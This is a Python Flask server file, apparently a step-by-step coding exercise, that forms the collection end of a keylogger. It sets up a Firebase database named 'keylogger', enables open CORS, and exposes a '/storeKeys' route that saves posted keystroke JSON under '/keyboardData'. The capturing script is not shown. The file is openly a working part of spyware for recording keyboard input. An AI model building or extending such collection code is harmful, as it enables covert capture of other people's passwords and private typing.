from flask import Flask, render_template, request, jsonify
import os
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
from flask_cors import CORS

# Firebase setup
# Replace the database url and credentials path below
def firebaseInitialization():
    cred = credentials.Certificate("config/serviceAccountKey.json")
    firebase_admin.initialize_app(
        cred, {'databaseURL': 'https://keylogger-7820c-default-rtdb.firebaseio.com'})
    print("🔥🔥🔥🔥🔥 Firebase Connected! 🔥🔥🔥🔥🔥")


firebaseInitialization()

STATIC_DIR = os.path.abspath('static')

app = Flask(__name__, static_folder=STATIC_DIR)
CORS(app)
app.use_static_for_root = True
text = 'Welcome to keylogger'


# Create a route '/storeKeys' which accepts POST method
@app.route('/storeKeys', methods=["POST"])
# Define storeKeys() function
def storeKeys():
    # Get the JSON data from request and store it in keyValues variable
    keyValues = request.get_json()
    # Use db.reference() to get "/keyboardData" reference and store it in ref variable
    ref = db.reference("/keyboardData").get()

    # Check if ref exits
    if (ref):
        # set ref to db.reference("/keyboardData")
        ref = db.reference("/keyboardData")
        # Call update method on ref and pass keyValues
        ref.update(keyValues)
    # Else
    else:
        # Set ref to "/"
        ref = db.reference("/")
        # Call set() method and pass {"keyboardData": keyValues}
        ref.set({"keyboardData": keyValues})
    # Return True as json
    return jsonify(True)


@app.route('/', methods=["GET"])
def home():
    return render_template('index.html')


if __name__ == '__main__':
    app.run(debug=True, port=4000)
